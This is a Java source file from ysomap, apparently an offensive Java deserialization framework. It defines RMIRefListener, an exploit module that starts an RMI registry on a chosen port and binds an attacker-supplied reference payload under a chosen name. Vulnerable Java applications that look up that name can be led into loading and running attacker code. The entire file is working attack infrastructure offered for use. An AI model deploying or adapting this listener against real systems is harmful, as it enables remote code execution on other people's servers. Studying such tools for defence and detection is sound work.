package ysomap.exploit.rmi;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.exploit.Exploit;

import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"RefWrapper"})
@Dependencies({"need set a gadget to return"})
public class RMIRefListener extends Exploit {

    @Require(name = "lport", type = "int", detail = "local port to listen")
    public String lport;
    @Require(name = "factoryName", detail = "binding object's name")
    public String factoryName;

    public Object payload;
    public String payloadName;

    @Override
    public void run() {
        System.setProperty("sun.rmi.transport.tcp.logLevel","BRIEF");
        Registry registry = null;
        try {
            registry = LocateRegistry.createRegistry(Integer.parseInt(lport));
            registry.bind(factoryName, (Remote) payload);
        } catch (RemoteException | AlreadyBoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String toString() {
        return "RMIRefListener{" +
                "lport='" + lport + '\'' +
                ", factoryName='" + factoryName + '\'' +
                ", payload='" + payloadName + '\'' +
                '}';
    }
}
